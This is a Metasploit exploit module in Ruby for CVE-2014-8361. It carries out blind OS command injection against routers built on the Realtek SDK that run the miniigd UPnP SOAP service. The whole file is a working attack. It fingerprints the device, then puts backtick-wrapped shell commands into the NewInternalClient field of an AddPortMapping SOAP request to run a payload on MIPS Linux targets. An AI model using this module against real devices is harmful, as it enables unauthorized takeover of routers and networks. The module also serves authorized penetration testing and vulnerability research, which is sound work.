# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include REXML
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Realtek SDK Miniigd UPnP SOAP Command Execution&#039;,
      &#039;Description&#039; => %q{
        Different devices using the Realtek SDK with the miniigd daemon are vulnerable to OS command
        injection in the UPnP SOAP interface. Since it is a blind OS command injection vulnerability,
        there is no output for the executed command. This module has been tested successfully on a
        Trendnet TEW-731BR router with emulation.
      },
      &#039;Author&#039;      =>
        [
          &#039;Ricky "HeadlessZeke" Lawshae&#039;, # Vulnerability discovery
          &#039;Michael Messner <devnull[at]s3cur1ty.de>&#039; # Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2014-8361&#039;],
          [&#039;ZDI&#039;, &#039;15-155&#039;],
          [&#039;URL&#039;, &#039;http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Software-Development-KITchen-sink/ba-p/6745115#.VWVfsM_tmko&#039;],
          [&#039;URL&#039;, &#039;http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10055&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Apr 24 2015&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039; =>
        [
          [ &#039;MIPS Little Endian&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039;     => ARCH_MIPSLE
            }
          ],
          [ &#039;MIPS Big Endian&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039;     => ARCH_MIPSBE
            }
          ]
        ],
      &#039;DefaultTarget&#039;    => 0
      ))
 
      deregister_options(&#039;CMDSTAGER::DECODER&#039;, &#039;CMDSTAGER::FLAVOUR&#039;)
 
    register_options(
      [
        Opt::RPORT(52869) # port of UPnP SOAP webinterface
      ], self.class)
  end
 
  def check
    begin
      res = send_request_cgi({
        &#039;uri&#039; => &#039;/picsdesc.xml&#039;
      })
      if res && [200, 301, 302].include?(res.code) && res.headers[&#039;Server&#039;] =~ /miniupnpd\/1.0 UPnP\/1.0/
        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end
 
    Exploit::CheckCode::Unknown
  end
 
  def exploit
    print_status("#{peer} - Trying to access the device ...")
 
    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable device")
    end
 
    print_status("#{peer} - Exploiting...")
 
    execute_cmdstager(
      :flavour  => :echo,
      :linemax => 50,
      :nodelete => true
    )
  end
 
  def execute_command(cmd, opts)
    uri = &#039;/wanipcn.xml&#039;
    soap_action = &#039;urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping&#039;
    data_cmd = &#039;<?xml version="1.0"?>&#039; + build_soap_req
 
    begin
      res = send_request_cgi({
        &#039;uri&#039;    => uri,
        &#039;vars_get&#039; => {
          &#039;service&#039; => &#039;WANIPConn1&#039;
        },
        &#039;ctype&#039; => &#039;text/xml&#039;,
        &#039;method&#039; => &#039;POST&#039;,
        &#039;headers&#039; => {
          &#039;SOAPAction&#039; => soap_action
          },
        &#039;data&#039; => data_cmd.gsub(/CMD_HERE/, "`#{cmd.gsub(/\\/, &#039;\\\\\\\\\\&#039;)}`")
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
 
  def build_soap_req
    new_external_port = rand(32767) + 32768
    new_internal_port = rand(32767) + 32768
 
    xml = Document.new
 
    xml.add_element(
      &#039;SOAP-ENV:Envelope&#039;,
      {
        &#039;xmlns:SOAP-ENV&#039; => &#039;http://schemas.xmlsoap.org/soap/envelope/&#039;,
        &#039;SOAP-ENV:encodingStyle&#039; => &#039;http://schemas.xmlsoap.org/soap/encoding/&#039;
      })
 
    xml.root.add_element(&#039;SOAP-ENV:Body&#039;)
 
    body = xml.root.elements[1]
 
    body.add_element(
      &#039;m:AddPortMapping&#039;,
      {
        &#039;xmlns:m&#039; => &#039;urn:schemas-upnp-org:service:WANIPConnection:1&#039;
      })
 
    port_mapping = body.elements[1]
    port_mapping.add_element(&#039;NewLeaseDuration&#039;)
    port_mapping.add_element(&#039;NewInternalClient&#039;)
    port_mapping.add_element(&#039;NewEnabled&#039;)
    port_mapping.add_element(&#039;NewExternalPort&#039;)
    port_mapping.add_element(&#039;NewRemoteHost&#039;)
    port_mapping.add_element(&#039;NewProtocol&#039;)
    port_mapping.add_element(&#039;NewInternalPort&#039;)
 
    port_mapping.elements[&#039;NewLeaseDuration&#039;].text  = &#039;&#039;
    port_mapping.elements[&#039;NewInternalClient&#039;].text = &#039;CMD_HERE&#039;
    port_mapping.elements[&#039;NewEnabled&#039;].text        = &#039;1&#039;
    port_mapping.elements[&#039;NewExternalPort&#039;].text   = "#{new_external_port}"
    port_mapping.elements[&#039;NewRemoteHost&#039;].text     = &#039;&#039;
    port_mapping.elements[&#039;NewProtocol&#039;].text       = &#039;TCP&#039;
    port_mapping.elements[&#039;NewInternalPort&#039;].text   = "#{new_internal_port}"
 
    xml.to_s
  end
 
end

